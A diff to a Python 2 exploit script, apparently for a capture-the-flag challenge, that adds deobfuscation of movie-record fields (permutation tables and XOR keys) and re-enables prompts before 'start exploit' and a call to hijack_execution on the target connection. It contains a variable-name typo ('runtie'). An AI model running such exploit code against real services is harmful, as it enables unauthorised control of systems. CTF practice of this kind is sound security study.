@@ -311,6 +311,49 @@ def build_movie():
 
     average_rating = build_nop_string(3)
 
+    #def undo_permute(field, fieldLen, perm, permLen):
+    #def undo_xor(field, field_len, xor_key, xor_key_len):
+
+    # Fix permutated fields
+    permStar_3 = [13, 1, 0, 12, 2, 11, 4, 10, 14, 5, 8, 6, 3, 7, 9]
+    star3 = undo_permute(star3, 300, permStar_3, 15)
+
+    permSummary = [191, 59, 91, 88, 103, 109, 157, 119, 35, 38, 80, 107, 99, 153, 49, 143, 
+        100, 33, 36, 42, 135, 44, 56, 169, 194, 28, 172, 186, 189, 19, 16, 112, 51, 165, 
+        53, 156, 181, 144, 136, 177, 128, 126, 159, 120, 68, 176, 5, 15, 29, 84, 21, 8, 
+        31, 166, 193, 93, 116, 179, 87, 140, 17, 146, 75, 89, 97, 134, 161, 67, 46, 55, 
+        122, 12, 76, 86, 174, 163, 168, 34, 24, 150, 158, 45, 30, 32, 138, 82, 63, 184, 
+        131, 39, 9, 198, 121, 3, 105, 43, 199, 18, 14, 81, 149, 164, 118, 23, 71, 178, 
+        190, 187, 57, 78, 129, 151, 106, 73, 141, 61, 98, 11, 192, 69, 60, 182, 160, 173, 
+        117, 58, 108, 83, 48, 27, 124, 102, 22, 185, 79, 170, 66, 96, 104, 41, 123, 40, 
+        197, 132, 180, 111, 20, 85, 54, 148, 101, 137, 113, 7, 65, 47, 142, 26, 25, 183, 
+        6, 114, 162, 175, 37, 70, 92, 74, 13, 94, 154, 155, 115, 64, 1, 10, 50, 95, 152, 
+        62, 4, 0, 77, 196, 133, 130, 147, 188, 2, 127, 139, 167, 171, 145, 90, 125, 110, 
+        52, 72, 195]
+    summary = undo_permute(summary, 2000, permSummary, 200)
+
+    # Fix xor fields
+    keyDirector = "\x26\xf8\x2b\xff\x7b\x2d"
+    keyStar_2 = "\xe7\x1e\x90\xa1\x80\x93\xb5\x83\x3a\xe4"
+    keyBudget = "\x63\x51\x13\xbe"
+    keyOpening_Weekend = ("\xd6\x22\x9a\x95\x9e\xb1\x65\xf5\x72\x1f\xd9\x2e\x71\x2e\x58\xae"
+        "\xe8\x2e\x44\xe5\x44\xee\x5f\xd4\x86\xdc\x10\xd5\xe6\x70\x38\xac\xb0\x80\xd6\x79"
+        "\x46\x96\x85\x0a\xac\x4f\x8c\xa9\xb7\x98\x2d\xab\x14\x1a\x8b\x26\x36\x1d\x3e\xb8"
+        "\x4f\x21\xe5\xfe\xa3\xf7\xde\x26\xea\xdb\xe2\x67\xe0\xde\xca\xdc\x14\xbe\xa2\xff\x28\xd2\x8e\x14")
+    keyGross = "\xcf\x1e\x33\x4a\x8f\x26\xcd\x8d\x86\x8c\x4e\x76\x3f\x1f\xa6\xe3\x2d\xa9\x85\xdd"
+    keyRuntime = "\xfc\x8c\xc7\x03\xe3\x5a\xad\x30\x0c\x2d\x4d\x1c\xee\x37\xb1\x51\x75\x99\xed\x96"
+    keyAspect = "\xf1\xcd"
+    keyComposer = "\xa0\x31\x7b\xd5\xfd\xd9\xbc\x27\x03\xb4\x83\xb7\xf1\xba\xe7"
+
+    director = undo_xor(director, 300, keyDirector, 6)
+    star2 = undo_xor(star2, 300, keyStar_2, 10)
+    budget = undo_xor(budget, 80, keyBudget, 4)
+    opening_weekend = undo_xor(opening_weekend, 80, keyOpening_Weekend, 80)
+    gross = undo_xor(gross, 80, keyGross, 20)
+    runtie = undo_xor(runtime, 80, keyRuntime, 20)
+    aspect = undo_xor(aspect, 40, keyAspect, 2)
+    composer = undo_xor(composer, 300, keyComposer, 15)
+
     movie = {           
               "title" : title,
            "director" : director,
@@ -386,14 +429,14 @@ def undo_permute(field, fieldLen, perm, permLen):
 # Start the connection
 con = connect()
 
-#pause_script_msg("Press Enter to start exploit")
+pause_script_msg("Press Enter to start exploit")
 
 movie = build_movie()
 
 send_movie(movie, con)
 
 print "Movie sent"
-#pause_script_msg("Press Enter to start reviews")
+pause_script_msg("Press Enter to start reviews")
 
 #go_interactive(con)
 
@@ -432,4 +475,13 @@ hijack_execution(con)
 
 #exit(0)
 #send_movie(hacker, con)
+
+#test_string = ("this"
+#    "is"
+#    "a"
+#    "test"
+#    "string")
+#print test_string
+
+
 
